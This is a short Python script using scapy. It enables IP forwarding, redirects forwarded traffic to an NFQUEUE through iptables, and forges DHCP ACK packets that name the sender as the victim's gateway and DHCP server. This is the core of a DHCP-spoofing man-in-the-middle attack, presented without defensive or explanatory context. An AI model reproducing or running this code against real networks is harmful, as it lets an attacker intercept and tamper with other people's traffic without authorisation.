import time
import subprocess
import scapy.all as scapy





def enable_ip_forwarding():
    # Enable IP forwarding in the system
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    
    # Insert a rule in the FORWARD chain of iptables to redirect packets to the NFQUEUE with queue number 1
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


def disable_ip_forwarding():
    # Disable IP forwarding in the systema
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    
    # Delete the rule from the FORWARD chain of iptables that redirects packets to the NFQUEUE with queue number 1
    subprocess.call(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


def dhcp_spoof(target_ip, target_mac, spoof_ip, spoof_mac):
    # Create a DHCP ACK packet with the specified parameters
    dhcp_packet = (
        scapy.Ether(dst=target_mac, src=spoof_mac) /
        scapy.IP(src=spoof_ip, dst=target_ip) /
        scapy.UDP(sport=67, dport=68) /
        scapy.BOOTP(op=2, yiaddr=spoof_ip, siaddr=spoof_ip, chaddr=target_mac) /
        scapy.DHCP(options=[('message-type', 'ack'), ('server_id', spoof_ip), ('router', spoof_ip)])
    )
    
    # Send the DHCP ACK packet
    scapy.send(dhcp_packet, verbose=False)
    
    # Print a message indicating the DHCP ACK packet was sent
    print("Sent DHCP ACK packet from", spoof_ip, "to", target_ip)
